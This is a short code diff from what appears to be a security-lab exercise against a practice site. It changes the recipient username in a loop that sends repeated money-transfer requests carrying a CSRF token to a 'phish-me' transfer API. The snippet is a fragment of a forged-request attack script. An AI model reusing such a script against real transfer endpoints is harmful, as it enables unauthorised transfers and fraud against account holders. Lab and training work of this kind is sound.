@@ -8,7 +8,7 @@ for (let i = 0; i < COUNT; i++) {
  
     const params = new URLSearchParams(); 
     params.append('csrf_token', token); 
-    params.append('username', "z5602760"); 
+    params.append('username', "z5628880"); 
     params.append('amount', 1); 
  
     fetch("https://phish-me.quoccacorp.com/api/transfer", { 
